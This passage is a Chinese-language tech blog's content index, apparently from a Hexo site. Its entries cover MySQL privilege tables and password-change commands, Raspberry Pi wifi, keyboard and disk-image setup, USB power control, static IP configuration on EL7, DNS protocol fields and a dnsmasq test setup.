<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Alter_routine_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Execute_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Event_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
<tr>
<td align="left">Trigger_priv</td>
<td align="left">enum(‘N’,’Y’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">N</td>
</tr>
</tbody></table>
<h2 id="tables-priv表结构"><a href="#tables-priv表结构" class="headerlink" title="tables_priv表结构"></a>tables_priv表结构</h2><table>
<thead>
<tr>
<th align="left">Field</th>
<th align="left">Type</th>
<th align="center">Null</th>
<th align="center">Key</th>
<th align="left">Default</th>
<th align="left">Extra</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Host</td>
<td align="left">char(60)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Db</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">User</td>
<td align="left">char(16)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Table_name</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Grantor</td>
<td align="left">char(77)</td>
<td align="center">NO</td>
<td align="center">MUL</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Timestamp</td>
<td align="left">timestamp</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">CURRENT_TIMESTAMP</td>
<td align="left">on update CURRENT_TIMESTAMP</td>
</tr>
<tr>
<td align="left">Table_priv</td>
<td align="left">set(‘Select’,’Insert’,<br>‘Update’,’Delete’,<br>‘Create’,’Drop’,<br>‘Grant’,’References’,<br>‘Index’,’Alter’,<br>‘Create View’,<br>‘Show view’,’Trigger’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Column_priv</td>
<td align="left">set(‘Select’,’Insert’,<br>‘Update’,’References’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left"></td>
<td align="left"><br></td>
</tr>
</tbody></table>
<h2 id="columns-priv表结构"><a href="#columns-priv表结构" class="headerlink" title="columns_priv表结构"></a>columns_priv表结构</h2><table>
<thead>
<tr>
<th align="left">Field</th>
<th align="left">Type</th>
<th align="center">Null</th>
<th align="center">Key</th>
<th align="left">Default</th>
<th align="left">Extra</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Host</td>
<td align="left">char(60)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Db</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">User</td>
<td align="left">char(16)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Table_name</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Column_name</td>
<td align="left">char(64)</td>
<td align="center">NO</td>
<td align="center">PRI</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">Timestamp</td>
<td align="left">timestamp</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left">CURRENT_TIMESTAMP</td>
<td align="left">on update <br>CURRENT_TIMESTAMP</td>
</tr>
<tr>
<td align="left">Column_priv</td>
<td align="left">set(‘Select’,<br>‘Insert’,<br>‘Update’,<br>‘References’)</td>
<td align="center">NO</td>
<td align="center"></td>
<td align="left"></td>
<td align="left"><br></td>
</tr>
</tbody></table>
<h1 id="验证流程"><a href="#验证流程" class="headerlink" title="验证流程"></a>验证流程</h1><p><img src="/images/mysql/mysql_privilege_flow.png" alt="mysql_privilege_flow"></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL修改密码方法</title>
    <url>/2016/11/15/mysql/mysql-password-functions/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
<li>OS Version : rhel 6.4</li>
<li>MySQL Version : 5.6.31</li>
</ul>
<h1 id="改密权限"><a href="#改密权限" class="headerlink" title="改密权限"></a>改密权限</h1><ul>
<li>root可以修改所有用户密码</li>
<li>所有用户在无任何权限情况下可修改自己密码</li>
<li>获得“update所有库”权限的用户可修改任何用户密码（包括root）</li>
</ul>
<p><strong>(以上所诉，均使用<code>set password</code>方法)</strong></p>
<h1 id="改密三种方法"><a href="#改密三种方法" class="headerlink" title="改密三种方法"></a>改密三种方法</h1><h2 id="Set-Password"><a href="#Set-Password" class="headerlink" title="Set Password"></a>Set Password</h2><p><code>set password for &lt;用户名&gt;@&#123;localhost|%|...&#125; =password(&#39;&lt;密码&gt;&#39;);</code></p>
<h2 id="grant-…-identified-by"><a href="#grant-…-identified-by" class="headerlink" title="grant … identified by"></a>grant … identified by</h2><p><code>grant &lt;权限&gt; on &lt;数据库&gt;.&lt;数据表&gt; to &lt;user&gt;@&#123;localhost|%|...&#125; identified by &#39;&lt;密码&gt;&#39;;</code></p>
<h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p><code>update &lt;库名&gt;.&lt;表名&gt; set password=password(&#39;&lt;密码&gt;&#39;) where user=&#39;&lt;用户名&gt;&#39; and host=&#39;&#123;localhost | % | ...&#125;&#39;;</code></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>RPI WIFI用户名密码配置</title>
    <url>/2017/01/02/raspbarrypi/rpi3-wifi-usr-pwd-configuration/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Raspberrypi3自带wifi模块，用户可以通过配置用户名密码就可以建立wifi连接。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>硬件，RaspberryPi3</li>
<li>OS，raspbian jessie</li>
</ul>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>使用<code>wpa_passphrase &lt;SSID&gt; &lt;用户名&gt; &lt;密码&gt;</code>生成wifi连接需要的用户信息<br>然后，将<code>wpa_passphrase</code>生成的信息，追加到<code>/etc/wpa_supplicant/wpa_supplicant.conf</code>中<br>最后重启系统。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.raspberrypi.org/documentation/configuration/wireless/wireless-cli.md">SETTING WIFI UP VIA THE COMMAND LINE</a></li>
</ul>
]]></content>
      <categories>
        <category>rpi</category>
      </categories>
      <tags>
        <tag>rpi3</tag>
        <tag>wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>img制作</title>
    <url>/2017/01/20/raspbarrypi/rpi3-make-image/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>新买了一个TF卡，Class10的，应该能挺快。原来的卡是class4的，如果用新卡做系统，然后所有软件都重装重配，太麻烦！所以将现有系统，做成镜像（img），然后直接<code>dd</code>到新卡上，然后再执行<code>raspi-conf</code>进行容量扩展就可以正常使用了。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>硬件，RaspberryPi3</li>
<li>OS，raspbian jessie</li>
</ul>
<h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="安装需要的软件"><a href="#安装需要的软件" class="headerlink" title="安装需要的软件"></a>安装需要的软件</h2><p>安装<code>dosfstools</code>、<code>parted</code>、<code>kpartx</code>软件及依赖包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install dosfstools parted kpartx</span><br></pre></td></tr></table></figure>

<h2 id="计算镜像大小"><a href="#计算镜像大小" class="headerlink" title="计算镜像大小"></a>计算镜像大小</h2><p>获取<code>/dev/root</code>和<code>/dev/mmcblk0p1</code>占用的空间，然后计算镜像大小，计算公式：1.2 * (size(&#x2F;dev&#x2F;root) + size(&#x2F;dev&#x2F;mmcblk0p1))</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">df</span> -P</span></span><br><span class="line">Filesystem     1024-blocks      Used Available Capacity Mounted on</span><br><span class="line">/dev/root         30690780   1390740  28024812       5% /</span><br><span class="line">/dev/mmcblk0p1       64366     20698     43668      33% /boot</span><br></pre></td></tr></table></figure>
<p><code>df</code>返回的容量单位为KB。</p>
<h2 id="生成空白镜像文件"><a href="#生成空白镜像文件" class="headerlink" title="生成空白镜像文件"></a>生成空白镜像文件</h2><p>使用<code>dd</code>和<code>/dev/zero</code>生成空白镜像文件<code>sudo dd if=/dev/zero of=&#123;镜像文件&#125; bs=1K count=&#123;镜像大小（单位为K）&#125;</code></p>
<h2 id="分区镜像文件并格式化"><a href="#分区镜像文件并格式化" class="headerlink" title="分区镜像文件并格式化"></a>分区镜像文件并格式化</h2><h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>使用<code>parted</code>为img文件分区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">标记label，选择MBR or GPT主引导格式，MBR:msdos, GPT:gpt</span></span><br><span class="line">sudo parted &#123;镜像文件&#125; -s -- mklabel msdos</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建分区</span></span><br><span class="line">sudo parted &#123;镜像文件&#125; -s -- mkpart primary fat32 &#123;开始扇区&#125;s &#123;结束扇区&#125;s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建分区</span></span><br><span class="line">sudo parted &#123;镜像文件&#125; -s -- mkpart primary ext4 &#123;开始扇区&#125;s -1</span><br></pre></td></tr></table></figure>
<p>开始扇区和结束扇区可是通过<code>sudo fdisk -l /dev/mmcblk0</code>来查看。</p>
<h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>在格式化前，需要先将img文件映射给系统的loop设备，然后在将loop设备映射给device mapper。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">映射loop设备</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> losetup -f --show &#123;镜像文件&#125;</span></span><br><span class="line">/dev/loop0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">device mapper</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> kpartx -va /dev/loop0</span></span><br><span class="line">add map loop0p1 (254:0): 0 257 linear /dev/loop0 256</span><br><span class="line">add map loop0p2 (254:1): 0 18015 linear /dev/loop0 513</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">格式化</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mkfs.vfat /dev/mapper/loop0p1</span></span><br><span class="line">......</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mkfs.ext4 /dev/mapper/loop0p2</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<h2 id="挂载并备份系统"><a href="#挂载并备份系统" class="headerlink" title="挂载并备份系统"></a>挂载并备份系统</h2><p>备份<code>/boot</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mount -f vfat /dev/mapper/loop0p1 /media</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> <span class="built_in">cp</span> -rfp /boot/* /media/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> umount /media</span></span><br></pre></td></tr></table></figure>

<p>备份<code>/</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> mount -t ext4 /dev/mapper/loop0p2 /media</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> rsync -aP --exclude=&#123;镜像文件&#125; --exclude=/media/* --exclude=/sys/* --exclude=/proc/* --exclude=/tmp/* / /media/</span></span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> umount /media</span></span><br></pre></td></tr></table></figure>

<h2 id="卸载打包镜像文件"><a href="#卸载打包镜像文件" class="headerlink" title="卸载打包镜像文件"></a>卸载打包镜像文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭device mapper</span></span><br><span class="line">sudo kpartx -d /dev/loop0</span><br><span class="line"></span><br><span class="line">＃关闭 loop 设备</span><br><span class="line">sudo losetup -d /dev/loop0</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/talkxin/article/details/50456282">制作树莓派最小镜像-img裁剪瘦身</a></li>
</ul>
]]></content>
      <categories>
        <category>rpi</category>
      </categories>
      <tags>
        <tag>rpi3</tag>
        <tag>image</tag>
      </tags>
  </entry>
  <entry>
    <title>RPI键盘配置</title>
    <url>/2017/01/02/raspbarrypi/rpi3-keyboard-configuration/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Raspberrypi原产至英国，其语言及键盘布局都是GB版的。而我们目前接触到的都是US版的。所以这里需要对键盘布局进行切换一下。</p>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>硬件，RaspberryPi3</li>
<li>OS，raspbian jessie</li>
</ul>
<h1 id="键盘配置"><a href="#键盘配置" class="headerlink" title="键盘配置"></a>键盘配置</h1><p>在命令行中输入<code>sudo raspi-config</code>，进入<code>Internationaliation Options</code>，选择<code>Change Keyboard Layout</code>，弹出键盘配置界面。</p>
<p>然后选择<code>Generic 101-key PC</code>，在layout中选择<code>Other</code>，然后在<code>Country of origin for the keyboard</code>中选择<code>English (US)</code>，再在<code>Keyboard Layout</code>页面中选择<code>English (US, alternative international)</code></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://blog.csdn.net/c80486/article/details/8460271">树莓派(raspberry pi)学习4: 更改键盘布局</a></li>
</ul>
]]></content>
      <categories>
        <category>rpi</category>
      </categories>
      <tags>
        <tag>rpi3</tag>
        <tag>keyboard</tag>
      </tags>
  </entry>
  <entry>
    <title>控制USB设备的电源</title>
    <url>/2016/06/07/power/20160607-control-usb-power/</url>
    <content><![CDATA[<h2 id="上电"><a href="#上电" class="headerlink" title="上电"></a>上电</h2><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;1-4.4.4&quot; &gt; /sys/bus/usb/drivers/usb/bind</span><br></pre></td></tr></table></figure>

<h2 id="下电"><a href="#下电" class="headerlink" title="下电"></a>下电</h2><p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;1-4.4.4&quot; &gt; /sys/bus/usb/drivers/usb/unbind</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://stackoverflow.com/questions/4702216/controlling-a-usb-power-supply-on-off-with-linux">Controlling a USB power supply(on&#x2F;off) with linux</a></li>
</ul>
]]></content>
      <categories>
        <category>power</category>
      </categories>
      <tags>
        <tag>usb</tag>
      </tags>
  </entry>
  <entry>
    <title>el7 静态 ip 配置</title>
    <url>/2016/04/29/network/20160429-el7-static-ip-config/</url>
    <content><![CDATA[<h1 id="查看网卡"><a href="#查看网卡" class="headerlink" title="查看网卡"></a>查看网卡</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip link</span><br></pre></td></tr></table></figure>

<h1 id="修改网卡配置"><a href="#修改网卡配置" class="headerlink" title="修改网卡配置"></a>修改网卡配置</h1><ul>
<li>修改配置文件ifcfg-{网卡名称}<br>eg: &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eno16777736</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.1.234</span><br><span class="line">GATEWAY=192.168.1.1</span><br><span class="line">DNS1=202.96.64.68</span><br><span class="line">DNS2=8.8.8.8</span><br></pre></td></tr></table></figure>
<ul>
<li>修改resolv.conf<br>eg: &#x2F;etc&#x2F;resolv.conf<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nameserver 202.96.64.68</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="重启network服务"><a href="#重启network服务" class="headerlink" title="重启network服务"></a>重启network服务</h1><p>重启network服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="http://www.centoscn.com/CentOS/config/2014/0902/3639.html">centos7配置静态IP</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>config</tag>
        <tag>ip</tag>
        <tag>rhel7</tag>
      </tags>
  </entry>
  <entry>
    <title>DNS协议</title>
    <url>/2017/02/17/network/dns-protocol/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>IP地址对于人来说很难记忆区分，但域名却很方便记忆，所以要将域名与IP地址对应起来，就催生了DNS。DNS不仅提供域名到IP的映射服务，还能提供主机别名、邮件服务器识别、负载均衡服务。</p>
<h1 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h1><p>DNS属于应用层协议，通常由HTTP、SMTP、FTP等协议使用，占用53端口。</p>
<h2 id="交互流程"><a href="#交互流程" class="headerlink" title="交互流程"></a>交互流程</h2><p><img src="/images/dns/dns_protocol.png" alt="dns_protocol"></p>
<ul>
<li>客户端发送一个包含域名的请求给DNS服务器（DNS查询报文）</li>
<li>DNS服务器查询到域名对应的IP地址后，给客户端一个应答回复（DNS应答报文），回复中包含客户端所请求域名对应的IP地址</li>
<li>客户端收到回复后，取出IP地址，与该地址服务器建立链接</li>
</ul>
<h2 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h2><p>DNS协议分为查询协议和应答协议，这两种协议的格式是一样的。</p>
<p><img src="/images/dns/dns-protocol-format.png" alt="dns-protocol-format"></p>
<p>DNS协议包括两部分，协议头和协议体</p>
<h3 id="协议头"><a href="#协议头" class="headerlink" title="协议头"></a>协议头</h3><p>DNS协议头由固定的12个字节组成</p>
<ul>
<li>ID<br>  由程序分配的16位标识符，该标识在查询时产生，应答报文中该ID与对应的查询请求ID相同。</li>
<li>QR<br>  表示该报文类型，“0”表示查询，“1”表示应答</li>
<li>OPcode<br>  表示查询种类，只在查询协议中作用。“0”为标准查询（QUERY），“1”为反相查询（IQUERY），“2”为服务器状态请求（STATUS），“3”～“15”为保留</li>
<li>AA<br>  授权应答的标志位。该位在应答报文中有效，“1”表示名字服务器是权限服务器</li>
<li>TC<br>  截断标志位。1表示响应已超过512字节并已被截断。(截断和UDP协议有关)</li>
<li>RD<br>  期望递归标志，作用在查询报文中，该位为“1”表示客户端希望得到递归应答</li>
<li>RA<br>  递归可用标志，作用在应答报文中，该位为“1”表示可以得到递归应答</li>
<li>zero<br>  用“0”占位，保留字段</li>
<li>Rcode<br>  返回码，在应答报文中出现，“0”表示无差错，“1”表示格式差错，“2”表示问题在域名服务器上，“3”表示域参照问题，“4”表示查询类型不支持，“5”表示在管理上被禁止，“6”～“15”预留</li>
<li>QD Count<br>  查询信息的数量</li>
<li>AN Count<br>  应答信息的数量</li>
<li>NS Count<br>  授权信息的数量</li>
<li>AR Count<br>  附加信息的数量</li>
</ul>
<h3 id="协议体"><a href="#协议体" class="headerlink" title="协议体"></a>协议体</h3><h4 id="查询段"><a href="#查询段" class="headerlink" title="查询段"></a>查询段</h4><p>描述查询信息</p>
<ul>
<li>QNAME<br>  表示需要查询的域名，该字段为变长字段，用标签序列表示域名（如：<a href="http://www.baidu.com/">www.baidu.com</a> 显示为 03 77 77 77 05 62 61 69 64 75 03 63 6f 6d 00）</li>
<li>QTYPE<br>  表示查询资源的类型，详细请见下文资源类型列表</li>
<li>QCLASS<br>  表示查询网络类别，“1”表示Internet互联网系统(助记“IN”)，“CH”表示Chaos</li>
</ul>
<h4 id="应答段、授权段、附加段"><a href="#应答段、授权段、附加段" class="headerlink" title="应答段、授权段、附加段"></a>应答段、授权段、附加段</h4><p>对应答信息、授权信息、附加信息的描述</p>
<ul>
<li>NAME<br>  资源记录对应的域名，该字段为变长字段，格式同QNAME</li>
<li>TYPE<br>  同QTYPE</li>
<li>CLASS<br>  同QCLASS</li>
<li>TTL<br>  表示资源记录的生命周期（以秒为单位），一般用于当地址杰西程序读取资源记录后决定保存及使用缓存数据的时间</li>
<li>RDLENGTH<br>  表示资源数据的长度</li>
<li>RDATA<br>  资源数据，按查询段要求返回的相关资源记录数据。<br>  若其TYPE为A，则返回4字节的IP地址；<br>  若其TYPE为NS，则返回授权域名服务器的域名；<br>  若其TYPE为CNAME，则返回规范名或与别名对应的真实名称。</li>
</ul>
<h4 id="资源类型列表"><a href="#资源类型列表" class="headerlink" title="资源类型列表"></a>资源类型列表</h4><table>
<thead>
<tr>
<th align="center">助记符</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">A</td>
<td align="left">指定主机名（或域名）对应的IPv4地址记录</td>
</tr>
<tr>
<td align="center">AAAA</td>
<td align="left">指定主机名（或域名）对应的IPv6地址记录</td>
</tr>
<tr>
<td align="center">CNAME</td>
<td align="left">别名 如：dig <a href="http://www.baidu.com/">www.baidu.com</a>, <a href="http://www.baidu.com.的cname就是www.a.shifen.com/">www.baidu.com.的cname就是www.a.shifen.com</a>.</td>
</tr>
<tr>
<td align="center">PTR</td>
<td align="left">指针记录，用于将一个IP地址映射到对应的主机名,也可以看成是A记录的反向,通过IP访问域名</td>
</tr>
<tr>
<td align="center">MX</td>
<td align="left">邮件路由记录，用户可以将该域名下的邮件服务器指向到自己的mail server上，然后即可自行操控所有的邮箱设置</td>
</tr>
<tr>
<td align="center">TXT</td>
<td align="left">一般指为某个主机名或域名设置的说明，没啥用，可忽略</td>
</tr>
<tr>
<td align="center">SRV</td>
<td align="left">记录了哪台计算机提供了哪个服务</td>
</tr>
<tr>
<td align="center">NS</td>
<td align="left">域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</td>
</tr>
</tbody></table>
<ul>
<li>SRV<br>  格式：优先级 权重 端口 服务的名字.协议的类型.域名<br>  eg:  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_http._tcp.example.com. SRV 10 5 80. www.example.com</span><br><span class="line">_http - 服务名</span><br><span class="line">_tcp  - 协议</span><br><span class="line">10    - 优先级</span><br><span class="line">5     - 权重</span><br><span class="line">80    - 端口</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="内部流程"><a href="#内部流程" class="headerlink" title="内部流程"></a>内部流程</h2><p><img src="/images/dns/dns-work-flow.gif" alt="dns-work-flow"></p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li>RFC1035</li>
<li><a href="http://www.360doc.com/content/11/0809/17/706976_139190573.shtml">DNS协议应用</a></li>
<li><a href="http://blog.csdn.net/hunanchenxingyu/article/details/21488291">结合Wireshark分析DNS 协议</a></li>
</ul>
]]></content>
      <categories>
        <category>network</category>
      </categories>
      <tags>
        <tag>protocol</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>DNSmasq使用</title>
    <url>/2017/11/20/network/dnsmasq-usage/</url>
    <content><![CDATA[<p>DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。它服务那些只在本地适用的域名，这些域名是不会在全球的DNS服务器中出现的。DHCP服务器和DNS服务器结合，并且允许DHCP分配的地址能在DNS中正常解析，而这些DHCP分配的地址和相关命令可以配置到每台主机中，也可以配置到一台核心设备中（比如路由器），DNSmasq支持静态和动态两种DHCP配置方式。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>在<code>rhel7.4</code>上的安装<code>yum install -y dnsmasq</code>, 完成dnsmasq的安装同时也推荐安装<code>bind-utils</code>，这个包提供很多dns测试相关工具<code>yum install -y bind-utils</code>, 如<code>dig</code>、<code>nslookup</code></p>
<h1 id="配置启动"><a href="#配置启动" class="headerlink" title="配置启动"></a>配置启动</h1><p>创建两个dnsmasq节点，一个做<code>base dns</code>，一个做<code>upper dns</code></p>
<p><code>base dns</code>的<code>dnsmasq.conf</code>配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen-address=172.17.0.2,127.0.0.1</span><br><span class="line"></span><br><span class="line"># 配置上游DNS服务器</span><br><span class="line">server=/dockxen.mydns/172.17.0.3</span><br><span class="line"></span><br><span class="line"># 配置别名</span><br><span class="line">cname=web.dockxen.dns,rhel82</span><br></pre></td></tr></table></figure>
<p>*** 在使用CNAME时，<code>&lt;target&gt;</code>必须本机可访问对象，所以此处我将<code>rhel82</code>放到<code>/etc/hosts</code>中 ***</p>
<p><code>base dns</code>的<code>/etc/hosts</code>配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">172.17.0.2      dnsbase</span><br><span class="line">192.168.1.82    rhel82</span><br></pre></td></tr></table></figure>

<p><code>upper dns</code>配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address=/myweb.dockxen.mydns/192.168.1.82</span><br><span class="line"></span><br><span class="line">listen-address=172.17.0.3,127.0.0.1</span><br><span class="line"></span><br><span class="line"># The fields are &lt;name&gt;,&lt;target&gt;,&lt;port&gt;,&lt;priority&gt;,&lt;weight&gt;</span><br><span class="line">srv-host=_ldap._tcp.dockxen.mydns,myweb.dockxen.mydns,8000,0,100</span><br></pre></td></tr></table></figure>

<p>完成<code>base dns</code>和<code>upper dns</code>的配置后使用<code>dnsmasq -d</code> debug模式启动，可以看到部分调试信息</p>
<h1 id="测试验证"><a href="#测试验证" class="headerlink" title="测试验证"></a>测试验证</h1><p>测试验证需要安装<code>bind-utils</code>，测试中会用到其中的<code>dig</code>和<code>nslookup</code>，开始测试前修改<code>/etc/resolv.conf</code>中的<code>nameserver 172.17.0.2</code></p>
<h2 id="验证A"><a href="#验证A" class="headerlink" title="验证A"></a>验证A</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@dnclient /]# dig myweb.dockxen.mydns</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.9.4-RedHat-9.9.4-51.el7 &lt;&lt;&gt;&gt; myweb.dockxen.mydns</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 22751</span><br><span class="line">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;myweb.dockxen.mydns.           IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">myweb.dockxen.mydns.    0       IN      A       192.168.1.82</span><br><span class="line"></span><br><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 172.17.0.2#53(172.17.0.2)</span><br><span class="line">;; WHEN: Mon Nov 20 09:29:48 UTC 2017</span><br><span class="line">;; MSG SIZE  rcvd: 53</span><br><span class="line"></span><br><span class="line">[root@dnclient /]# nslookup myweb.dockxen.mydns</span><br><span class="line">Server:         172.17.0.2</span><br><span class="line">Address:        172.17.0.2#53</span><br><span class="line"></span><br><span class="line">Name:   myweb.dockxen.mydns</span><br><span class="line">Address: 192.168.1.82</span><br></pre></td></tr></table></figure>

